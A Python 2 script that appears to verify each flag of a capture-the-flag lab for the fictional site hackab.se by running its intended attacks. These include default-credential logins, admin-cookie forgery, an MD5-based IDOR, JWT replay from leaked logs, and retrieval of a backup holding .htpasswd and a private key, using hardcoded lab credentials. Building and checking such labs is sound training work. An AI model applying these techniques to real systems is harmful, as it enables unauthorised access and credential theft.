#!/usr/bin/python

from collections import OrderedDict
import requests
import json
import re
import socket
import hashlib
import base64
from zipfile import ZipFile
import os
import tarfile
import shutil
import dns.resolver
import magic
import urllib
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)

# USERS
def TESTUSER(user):
	data = {'username': users[user]["username"], 'password': users[user]["password"]}
	r = requests.post("http://www.hackab.se/administration", data=data)

	if r.cookies["HAB_UID"] == users[user]["uid"]:
		r = requests.get("http://www.hackab.se/robots.txt", proxies={
			"http": users[user]["username"] + ":" + urllib.quote(users[user]["password"]) + "@hackab.se:3128"
		})

	if r.status_code == 200:
		print user.ljust(24) + "\t\033[92mPASS\033[0;0m"
	else:
		print user.ljust(24) + "\t\033[91mFAIL\033[0;0m"

# FLAGS
def TESTFLAG(flag):
	try:
		RESULT = globals()[flag](flags[flag])
		if RESULT == "PASS":
			print flags[flag]["title"].ljust(24) + "\t\033[92mPASS\033[0;0m"
		elif RESULT == "PROVISIONAL":
			print flags[flag]["title"].ljust(24) + "\t\033[94mPROVISIONAL\033[0;0m"
		elif RESULT == "SKIP":
			print flags[flag]["title"].ljust(24) + "\t\033[94mSKIP\033[0;0m"
		else:
			print flags[flag]["title"].ljust(24) + "\t\033[91mFAIL\033[0;0m"
	except Exception as e:
		#print e
		print flags[flag]["title"].ljust(24) + "\t\033[93mERROR\033[0;0m"

def HELLOWORLD(flag):
	r = requests.get("https://bugbounty.hackab.se", verify=False)
	if flag["flag"] in r.text:
		data = {'flags': flag["flag"]}
		r = requests.post("https://bugbounty.hackab.se/?submit_flag", data=data, verify=False)
		if flag["title"] in r.text:
			return "PASS"

def WHOSYOURSOURCE(flag):
	r = requests.get("http://www.hackab.se")
	if flag["flag"] in r.text:
		return "PASS"

def KILLALLHUMANS(flag):
	r = requests.get("http://www.hackab.se/robots.txt")
	if flag["flag"] in r.text:
		return "PASS"

def GLOBETROTTER(flag):
	r = requests.get("http://www.hackab.se/international", proxies={
		"http": "http://thomas%40hackab.se:Sommar19@hackab.se:3128"
	})
	if flag["flag"] in r.text:
		return "PROVISIONAL"

def CWE209(flag):
	r = requests.get("http://www.hackab.se/index.php")
	if flag["flag"] in r.text:
		return "PASS"

def NOWTELLMEYOURREALSOURCE(flag):
	r = requests.get("http://www.hackab.se/index.phps")
	if flag["flag"] in r.text:
		return "PASS"

def IDOR(flag):
	r = requests.get("http://www.hackab.se/index.php")
	# regex = re.search(".*\"backup-flag\":\"(.*?)\"", r.text.replace("\\", ""))
	regex = re.search(".*\"backup-flag\":\"\.(.*?)\"", r.text.replace("\\", ""))

	path = regex.groups()[0]

	r = requests.get("http://www.hackab.se" + path)
	if flag["flag"] in r.text:
		return "PASS"

def REDACTED(flag):
	urllib.urlretrieve("http://www.hackab.se/files?id=6", "/tmp/HAB-redacted.pdf")

	mime = magic.Magic(mime=True)
	filetype = mime.from_file("/tmp/HAB-redacted.pdf")
	if filetype == "application/pdf":
		os.remove("/tmp/HAB-redacted.pdf")
		return "PROVISIONAL"

def ITWORKS(flag):
	ip = socket.gethostbyname("www.hackab.se")
	r = requests.get("http://" + ip + ":80")
	if flag["flag"] in r.text:
		return "PASS"

def CLOSEBUTNOCIGAR(flag):
	data = {'username': 'admin', 'password': 'password'}
	r = requests.post("http://www.hackab.se/administration", data=data)
	if flag["flag"] in r.text:
		return "PASS"

def WELCOMESUPERMANILOVEYOU(flag):
	data = {'username': 'thomas@hackab.se', 'password': 'Sommar19'}
	r = requests.post("http://www.hackab.se/administration", data=data)
	uid = r.cookies["HAB_UID"]

	r = requests.post("http://www.hackab.se/administration/messages?uid=" + uid)
	if flag["flag"] in r.text:
		return "PASS"

def ROBAC(flag):
	data = {'username': 'thomas@hackab.se', 'password': 'Sommar19'}
	r = requests.post("http://www.hackab.se/administration", data=data)
	session = r.cookies["HAB_SESS"]
	cookies = dict(HAB_ROLE="admin", HAB_SESS=session)

	r = requests.get("http://www.hackab.se/administration/status", cookies=cookies)
	if flag["flag"] in r.text:
		return "PASS"

def YOUVEGOTMAIL(flag):
	r = requests.get("http://www.hackab.se/om-oss")
	regex = re.search("(kathleen@hackab.se)", r.text)
	email = regex.groups()[0]
	uid = hashlib.md5(email.encode("utf-8")).hexdigest()

	r = requests.post("http://www.hackab.se/administration/messages?uid=" + uid)
	regex = re.search("fil.zip&quot;(.*?)--=-=", r.text.replace("\\n", "").replace("\\", ""))
	file_b64 = regex.groups()[0]
	file_zip = base64.b64decode(file_b64)

	with open("/tmp/fil.zip", "w") as file:
		file.write(file_zip)

	with ZipFile("/tmp/fil.zip") as zf:
		zf.extractall(path="/tmp", pwd="password")

	if flag["flag"] in open("/tmp/flag.txt").read():
		os.remove("/tmp/fil.zip")
		os.remove("/tmp/flag.txt")
		return "PASS"

def COMPUTERGENERATEDIMAGERY(flag):
	r = requests.post("http://www.hackab.se:8008/cgi-bin/status.cgi?command=sf")
	if flag["flag"] in r.text:
		return "PASS"

def HOMESWEETHOME(flag):
	addr = socket.gethostbyname("www.hackab.se")
	r = requests.post("http://" + addr + "/~steve/todo.txt")
	if flag["flag"] in r.text:
		return "PASS"

def GOTGPU(flag):
	addr = socket.gethostbyname("www.hackab.se")
	urllib.urlretrieve("http://" + addr + "/~steve/backup/hackab-backup.tar.gz", "/tmp/hackab-backup.tar.gz")

	tar = tarfile.open("/tmp/hackab-backup.tar.gz")
	tar.extractall(path="/tmp")
	tar.close()

	if "thomas@hackab.se" in open("/tmp/www.hackab.se/html/.htpasswd").read():
		mime = magic.Magic(mime=True)
		filetype = mime.from_file("/tmp/www.hackab.se/ssl/private/hackab.se.pem")
		if filetype == "text/plain":
			os.remove("/tmp/hackab-backup.tar.gz")
			shutil.rmtree("/tmp/www.hackab.se/html/")
			return "PROVISIONAL"

def READYGETSETTXT(flag):
	my_resolver = dns.resolver.Resolver()
	my_resolver.nameservers = ["8.8.8.8"]
	answers=my_resolver.query("www.hackab.se", "TXT")
	for answer in answers:
		if flag["flag"] in answer.to_text():
			return "PASS"

def ONTHESUBJECTOFVHOSTNAMES(flag):
	return "SKIP"

def THERESNOJWTOWAYSABOUTIT(flag):
	urllib.urlretrieve("ftp://thomas@hackab.se:Sommar19@hackab.se/employees/logs/api.hackab.se_access.log", "/tmp/api.hackab.se_access.log")
	regex = re.search("jwt=(.*?) ", open("/tmp/api.hackab.se_access.log").read())
	jwt = regex.groups()[0]

	r = requests.get("http://api.hackab.se:8008/employees", headers={"content-type":"application/json", "Authorization": "Bearer " + jwt})
	if flag["flag"] in r.text:
		os.remove("/tmp/api.hackab.se_access.log")
		return "PASS"

def EXTRAINTRANET(flag):
	r = requests.get("http://www.hackab.se:31337", proxies={
		"http": "http://thomas%40hackab.se:Sommar19@hackab.se:3128"
	})
	if flag["flag"] in r.text:
		return "PASS"

def MON0ITOREDATWORK(flag):
	urllib.urlretrieve("ftp://hackab.se/pub/wpa2.tar", "/tmp/wpa2.tar")

	tar = tarfile.open("/tmp/wpa2.tar")
	tar.extractall(path="/tmp")
	tar.close()

	mime = magic.Magic(mime=True)
	filetype = mime.from_file("/tmp/wpa2/wpa2.pcap")
	if filetype == "application/vnd.tcpdump.pcap":
		os.remove("/tmp/wpa2/wpa2.pcap")
		os.remove("/tmp/wpa2.tar")
		return "PROVISIONAL"

def MISHAP(flag):
	urllib.urlretrieve("ftp://thomas@hackab.se:Sommar19@hackab.se/employees/captures/HABLegacySvc.pcap", "/tmp/HABLegacySvc.pcap")

	mime = magic.Magic(mime=True)
	filetype = mime.from_file("/tmp/HABLegacySvc.pcap")
	if filetype == "application/vnd.tcpdump.pcap":
		os.remove("/tmp/HABLegacySvc.pcap")
		return "PROVISIONAL"

def CHECKYOURHEAD(flag):
	return "SKIP"

def DEPEDNSONWHOYOUASK(flag):
	return "SKIP"

def OUTOFSITEOUTOFMIND(flag):
	return "SKIP"

def GITGUD(flag):
	return "SKIP"

# RUN TESTS
with open("./json/users.json") as data: users = json.loads(data.read())
for user in users: TESTUSER(user)

with open("./json/flags.json") as data: flags = json.loads(data.read(), object_pairs_hook=OrderedDict)
for flag in flags: TESTFLAG(flag)

